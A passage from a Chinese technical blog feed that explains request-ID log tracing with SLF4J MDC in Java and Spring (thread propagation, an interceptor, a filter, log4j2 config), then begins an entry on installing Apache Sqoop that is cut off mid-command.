class="attr">ref</span>=<span class="string">"CONSOLE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-基础入门">2.2 基础入门</h3><p>SLF4J日志框架提供了一个MDC(Mapped Diagnostic Contexts)工具类，谷歌翻译为映射的诊断上下文，从字面上很难理解，我们可以先实战一把。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY = <span class="string">"requestId"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(Main<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 入口传入请求ID</span></span><br><span class="line">        MDC.put(KEY, UUID.randomUUID().toString());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 打印日志</span></span><br><span class="line">        logger.debug(<span class="string">"log in main thread 1"</span>);</span><br><span class="line">        logger.debug(<span class="string">"log in main thread 2"</span>);</span><br><span class="line">        logger.debug(<span class="string">"log in main thread 3"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 出口移除请求ID</span></span><br><span class="line">        MDC.remove(KEY);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在main函数的入口调用<code>MDC.put()</code>方法传入请求ID，在出口调用<code>MDC.remove()</code>方法移除请求ID。配置好log4j2.xml文件后，运行main函数，可以在控制台看到以下日志输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2023-03-04 20:37:05.572 [main] [requestId=dab8412a-f070-4406-9940-89fcdbd3473f] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> main thread 1</span><br><span class="line">2023-03-04 20:37:05.572 [main] [requestId=dab8412a-f070-4406-9940-89fcdbd3473f] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> main thread 2</span><br><span class="line">2023-03-04 20:37:05.572 [main] [requestId=dab8412a-f070-4406-9940-89fcdbd3473f] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> main thread 3</span><br></pre></td></tr></table></figure><p>从日志中可以明显地看到花括号中包含了（映射的）请求ID(requestId)，这其实就是我们定位（诊断）问题的关键字（上下文）。有了MDC工具，只要在接口或切面植入<code>put()</code>和<code>remove()</code>代码，在现网定位问题时，我们就可以通过<code>grep requestId=xxx *.log</code>快速的过滤出某次请求的所有日志。</p><h3 id="2-3-进阶提升">2.3 进阶提升</h3><p>然而，MDC工具真的有我们所想的这么方便吗？回到我们开头，一次请求可能涉及多线程异步处理，那么在多线程异步的场景下，它是否还能正常运作呢？Talk is cheap, show me the code。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY = <span class="string">"requestId"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(Main<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 入口传入请求ID</span></span><br><span class="line">        MDC.put(KEY, UUID.randomUUID().toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程打印日志</span></span><br><span class="line">        logger.debug(<span class="string">"log in main thread"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步线程打印日志</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                logger.debug(<span class="string">"log in other thread"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 出口移除请求ID</span></span><br><span class="line">        MDC.remove(KEY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码里我们新起了一个异步线程，并在匿名对象Runnable的<code>run()</code>方法打印日志。运行main函数，可以在控制台看到以下日志输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2023-03-04 20:38:06.594 [main] [requestId=bfbf71b4-2201-4558-b049-f613759eb88e] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> main thread</span><br><span class="line">2023-03-04 20:38:06.595 [Thread-0] [requestId=] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> other thread</span><br></pre></td></tr></table></figure><p>不幸的是，请求ID在异步线程里不打印了。这是怎么回事呢？要解决这个问题，我们就得知道MDC的实现原理。<strong>MDC之所以在异步线程中不生效是因为底层采用ThreadLocal作为数据结构</strong>，我们调用<code>MDC.put()</code>方法传入的请求ID只在当前线程有效。</p><p>知道了原理那么解决这个问题就轻而易举了，我们可以使用装饰器模式，新写一个<code>MDCRunnable</code>类对Runnable接口进行一层装饰。在创建<code>MDCRunnable</code>类时保存当前线程的MDC值，在执行<code>run()</code>方法时再将保存的MDC值拷贝到异步线程中去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MDCRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable runnable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, String&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MDCRunnable</span><span class="params">(Runnable runnable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.runnable = runnable;</span><br><span class="line">        <span class="comment">// 保存当前线程的MDC值</span></span><br><span class="line">        <span class="keyword">this</span>.map = MDC.getCopyOfContextMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 传入已保存的MDC值</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            MDC.put(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 装饰器模式，执行run方法</span></span><br><span class="line">        runnable.run();</span><br><span class="line">        <span class="comment">// 移除已保存的MDC值</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            MDC.remove(entry.getKey());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，我们需要对main函数里创建的Runnable实现类进行装饰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY = <span class="string">"requestId"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(Main<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 入口传入请求ID</span></span><br><span class="line">        MDC.put(KEY, UUID.randomUUID().toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程打印日志</span></span><br><span class="line">        logger.debug(<span class="string">"log in main thread"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步线程打印日志，用MDCRunnable装饰Runnable</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> MDCRunnable(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                logger.debug(<span class="string">"log in other thread"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步线程池打印日志，用MDCRunnable装饰Runnable</span></span><br><span class="line">        EXECUTOR.execute(<span class="keyword">new</span> MDCRunnable(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                logger.debug(<span class="string">"log in other thread pool"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">        EXECUTOR.shutdown();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 出口移除请求ID</span></span><br><span class="line">        MDC.remove(KEY);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行main函数，将会输出以下日志，可以发现多线程也请求同一个requestId了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2023-03-04 20:41:16.255 [main] [requestId=6bc1ffaa-379f-489c-8f12-59dba843472d] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> main thread</span><br><span class="line">2023-03-04 20:41:16.256 [Thread-0] [requestId=6bc1ffaa-379f-489c-8f12-59dba843472d] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> other thread</span><br><span class="line">2023-03-04 20:41:16.256 [pool-1-thread-1] [requestId=6bc1ffaa-379f-489c-8f12-59dba843472d] DEBUG com.example.mdc.mdc.Main - <span class="built_in">log</span> <span class="keyword">in</span> other thread pool</span><br></pre></td></tr></table></figure><h2 id="3、MDC-Spring">3、MDC+Spring</h2><p>对于一个 Spring 应用来说，我们想一下 Http 请求到达我们具体接口的时候，是不是还有 拦截器 <strong>HandlerInterceptor</strong> 和 过滤器 <strong>Filter</strong> 这两个，所以我们 把在 装有唯一序列标记的 MDC，就可以放这两个里面<code>MDC.put(&quot;RequestId&quot;, UUID.randomUUID().toString());</code></p><p><strong>我们可以让前端调用后端接口的时候，在 Header 里面生成一个唯一的字符串作为我们放 MDC的 RequestId</strong></p><h3 id="3-1-拦截器方式">3.1 拦截器方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebLogMdcHandlerInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MDC.put(<span class="string">"RequestId"</span>, UUID.randomUUID().toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MDC.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterConcurrentHandlingStarted</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        preHandle(request, response, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-过滤器方式">3.2 过滤器方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MDCFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String REQUEST_ID_HEADER = <span class="string">"RequestId"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String REQUEST_ID = <span class="string">"RequestId"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ProcessId_ID = <span class="string">"processId"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpRequest = (HttpServletRequest) request;</span><br><span class="line">        HttpServletResponse httpResponse = (HttpServletResponse) response;</span><br><span class="line">        String requestId = httpRequest.getHeader(REQUEST_ID_HEADER);</span><br><span class="line">        <span class="keyword">if</span> (requestId == <span class="keyword">null</span>) &#123;</span><br><span class="line">            requestId = UUID.randomUUID().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        MDC.put(REQUEST_ID, requestId);</span><br><span class="line">        httpResponse.setHeader(REQUEST_ID_HEADER, requestId);</span><br><span class="line">        <span class="keyword">int</span> processId = getProcessID();</span><br><span class="line">        MDC.put(ProcessId_ID, String.valueOf(processId));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            MDC.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getProcessID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(runtimeMXBean.getName().split(<span class="string">"@"</span>)[<span class="number">0</span>])</span><br><span class="line">                .intValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-日志配置">3.3 日志配置</h3><p>在日志上下文增加参数，在日志中可以打印该参数，如RequestId，则日志配置：<code>%d{yyyy-MM-dd HH:mm:ss.SSS} [%X{RequestId}] [%thread] %-5level %logger{36} - %msg%n</code>则 RequestId 会打印在中括号里，%X{参数名} 是格式</p><p>这里提供另一种配置方式，仅供参考，建议还是单独配置logback.xml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Configuration:</span></span><br><span class="line">  <span class="attr">Appenders:</span></span><br><span class="line">    <span class="attr">Console:</span>  <span class="comment"># 输出到控制台</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">CONSOLE</span></span><br><span class="line">      <span class="attr">target:</span> <span class="string">SYSTEM_OUT</span></span><br><span class="line">      <span class="attr">ThresholdFilter:</span></span><br><span class="line">        <span class="attr">level:</span> <span class="string">$&#123;sys:log.level.console&#125;</span> </span><br><span class="line">        <span class="attr">onMatch:</span> <span class="string">ACCEPT</span></span><br><span class="line">        <span class="attr">onMismatch:</span> <span class="string">DENY</span></span><br><span class="line">      <span class="attr">PatternLayout:</span></span><br><span class="line">        <span class="attr">pattern:</span> <span class="string">"%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%X&#123;RequestId&#125;] [%thread] [%-5level] [%logger:%L] [%m] %n"</span></span><br><span class="line">    <span class="attr">RollingFile:</span> <span class="comment"># 输出到文件，超过128MB归档</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ROLLING_FILE</span></span><br><span class="line">        <span class="attr">ignoreExceptions:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">fileName:</span> <span class="string">$&#123;log.path&#125;/$&#123;project.name&#125;/default.log</span></span><br><span class="line">        <span class="attr">filePattern:</span> <span class="string">"$&#123;log.path&#125;/$$&#123;date:yyyy-MM&#125;/$&#123;project.name&#125;/default-%d&#123;yyyy-MM-dd&#125;-%i.log.gz"</span></span><br><span class="line">        <span class="attr">PatternLayout:</span></span><br><span class="line">          <span class="attr">pattern:</span> <span class="string">"%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%X&#123;RequestId&#125;] [%thread] [%-5level] [%logger:%L] [%m] %n"</span></span><br><span class="line">        <span class="attr">Policies:</span></span><br><span class="line">          <span class="attr">SizeBasedTriggeringPolicy:</span></span><br><span class="line">            <span class="attr">size:</span> <span class="string">"128 MB"</span></span><br><span class="line">        <span class="attr">DefaultRolloverStrategy:</span></span><br><span class="line">          <span class="attr">max:</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、MDC日志定位&lt;/h1&gt;
&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-简介&quot;&gt;1.1 简介&lt;/h3&gt;
&lt;p&gt;MDC是可以帮组我们 在多线程条件下记录追踪日志的功能，它支持 Log4J和LogBack 两种日志框架通常打印出的日志会有线程号等信息来标志当前日志属于哪个线程，然而由于线程是可以重复使用的，所以并不能很清晰的确认一个请求的日志范围。处理这种情况一般有两种处理方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手动生成一个唯一序列号打印在日志中；&lt;/li&gt;
&lt;li&gt;使用日志控件提供的MDC功能，生成一个唯一序列标记一个线程的日志&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在现网出现故障时，我们经常需要获取一次请求流程里的所有日志进行定位。如果请求只在一个线程里处理，则我们可以通过线程ID来过滤日志，但同时如果请求包含异步线程的处理，那么光靠线程ID就显得捉襟见肘了，这也是需要解决的一个问题&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://blog.shawncoding.top/categories/Java/"/>
    
    
    <category term="SpringBoot" scheme="https://blog.shawncoding.top/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>离线数据同步Sqoop与DataX</title>
    <link href="https://blog.shawncoding.top/posts/dcc67dd9.html"/>
    <id>https://blog.shawncoding.top/posts/dcc67dd9.html</id>
    <published>2023-06-28T14:19:16.000Z</published>
    <updated>2023-06-28T14:27:09.217Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Sqoop安装与使用</h1><h2 id="1、简介">1、简介</h2><p>Sqoop全称是 <strong>Apache Sqoop</strong>(现已经抛弃)，是一个开源工具，能够将数据从数据存储空间（数据仓库，系统文档存储空间，关系型数据库）导入 Hadoop 的 HDFS或列式数据库HBase，供 MapReduce 分析数据使用。数据传输的过程大部分是通过 MapReduce 过程来实现，只需要依赖数据库的Schema信息Sqoop所执行的操作是并行的，数据传输性能高，具备较好的容错性，并且能够自动转换数据类型。</p><p>Sqoop是一个为高效传输海量数据而设计的工具，一般用在从关系型数据库同步数据到非关系型数据库中。Sqoop专门是为大数据集设计的。Sqoop支持增量更新，将新记录添加到最近一次的导出的数据源上，或者指定上次修改的时间戳。</p><a id="more"></a><h2 id="2、Sqoop安装">2、Sqoop安装</h2><blockquote><p><a href="https://sqoop.apache.org/" target="_blank" rel="noopener" title="https://sqoop.apache.org/">https://sqoop.apache.org/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我使用了1.4.6为例子，1.4.7还需要common包</span></span><br><span class="line">wget http://archive.apache.org/dist/sqoop/1.4.6/sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxf sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module</span><br><span class="line">mv sqoop-1.4.6.bin__hadoop-2.0.4-alpha/ sqoop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line"><span class="comment"># 进入到/opt/module/sqoop/conf目录，重命名配置文件</span></span><br><span class="line">mv sqoop-env-template.sh sqoop-env.sh</span><br><span class="line">vim sqoop-env.sh</span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_COMMON_HOME=/opt/module/hadoop-3.1.3</span><br><span class="line"><span class="built_in">export</span> HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3</span><br><span class="line"><span class="built_in">export</span> HIVE_HOME=/opt/module/hive</span><br><span class="line"><span class="built_in">export</span> ZOOKEEPER_HOME=/opt/module/zookeeper-3.5.7</span><br><span class="line"><span class="built_in">export</span> ZOOCFGDIR=/opt/module/zookeeper-3.5.7/conf</span><br><span class="line"><span class="comment"># 拷贝JDBC驱动</span></span><br><span class="line">cp mysql-connector-java-5.1.48.jar /opt/module/sqoop/lib/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证Sqoop</span></span><br><span class="line">bin/sqoop <span class="built_in">help</span></span><br><span class="line"><span class="comment"># 测试Sqoop是否能够成功连接数据库</span></span><br><span class="line">bin/sqoop list-databases --connect jdbc:mysql://hadoop102:3306/ --username root --password 123456</span><br></pre></td></tr></table></figure><h2 id="3、Sqoop实例">3、Sqoop实例</h2><h3 id="3-1-Mysql导入Hadoop">3.1 Mysql导入Hadoop</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 